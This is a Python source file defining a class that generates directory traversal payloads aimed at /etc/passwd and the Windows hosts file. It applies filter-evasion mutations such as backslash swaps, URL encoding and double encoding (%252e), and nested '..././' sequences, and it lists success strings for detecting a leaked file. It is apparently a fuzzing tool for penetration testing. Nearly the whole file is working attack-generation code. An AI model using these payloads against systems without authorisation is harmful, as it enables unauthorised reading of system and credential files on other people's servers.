import random, string
import urllib.parse



class DirectoryTraversalPayloadGenerator():
    def __init__(self):
        super().__init__()

        self.os_files = [
            ("linux","/etc/passwd"),
            ("windows","C:\\Windows\\System32\\drivers\\etc\\hosts")
        ]

        self.os_paths = [
            ("windows","C:\\Windows\\System32\\drivers\\etc"), 
            ("linux","etc"), 
            ("windows","Windows\\System32\\drivers\\etc")
        ]

        self.depth = 8
        self.traversal = []

        self.success_strings = [
            'This is a sample HOSTS file used by Microsoft',
            'Copyright (c) 1993-2009 Microsoft Corp.',
            'root:x:0:0:root:/root',
        ]

        self.url_encode_payload = False
        self.platforms = ["windows", "linux"]
        
    # generate dot dot shashes
    def generate_traversal(self):
        traversal = ""
        depth = int(self.depth)
        for i in range(1,depth+1):
            traversal += '../'
            self.traversal.append(traversal)

    def generate_all_payloads(self):
        # Generate traversal strings
        self.generate_traversal()

        result = []

        files = self.sanitize_double_slash(self.generate_traversal_files())
        paths = self.sanitize_double_slash(self.generate_traversal_paths())

        result.extend(files)
        result.extend(paths)

        mutate_files = self.generate_mutate(files)
        mutate_paths = self.generate_mutate(paths)

        result.extend(mutate_files)
        result.extend(mutate_paths)

        if self.url_encode_payload:
            url_encoded = self.url_encode(result)
            result.extend(url_encoded)

        return list(set(result))

    def generate_file_payloads(self):
        # Generate traversal strings
        self.generate_traversal()

        result = []

        files = self.sanitize_double_slash(self.generate_traversal_files())
        
        result.extend(files)
        
        mutate_files = self.generate_mutate(files)
        
        result.extend(mutate_files)
        
        if self.url_encode_payload:
            url_encoded = self.url_encode(result)
            result.extend(url_encoded)
        
        return list(set(result))

    def generate_path_payloads(self):
        # Generate traversal strings
        self.generate_traversal()

        result = []

        paths = self.sanitize_double_slash(self.generate_traversal_paths())

        result.extend(paths)

        mutate_paths = self.generate_mutate(paths)

        result.extend(mutate_paths)

        if self.url_encode_payload:
            url_encoded = self.url_encode(result)
            result.extend(url_encoded)
        
        return list(set(result))

    def generate_traversal_files(self):
        result = []
        for t in self.traversal:
            for f in self.os_files:
                if f[0] in self.platforms:
                    result.append(f"{t}{f[1]}")
        return result

    def generate_traversal_paths(self):
        result = []
        for t in self.traversal:
            for f in self.os_paths:
                if f[0] in self.platforms:
                    result.append(f"{t}{f[1]}")
        return result

    def sanitize_double_slash(self,traversal):
        result = []
        for t in traversal:
            r = t.replace('//','/')
            result.append(r)
        return result

    def generate_mutate(self, lista):
        result = []

        for a in lista:
            r = a.replace('/','\\')
            result.append(r)

            r = a.replace('/','../')
            result.append(r)

            r = a.replace('/','..\\/')
            result.append(r)

            r = a.replace('.','%2e')
            result.append(r)

            r = a.replace('/','%2f')
            result.append(r)
   
            r = a.replace('.','%2e').replace('/','%2f')
            result.append(r)

            r = a.replace('.','%252e').replace('/','%252f')
            result.append(r)

            r = a.replace('../','..././')
            result.append(r)

            r = a.replace('..\\',"...\\.\\")
            result.append(r)

        return result

    def url_encode(self, lista):
        return [urllib.parse.quote(p) for p in lista]

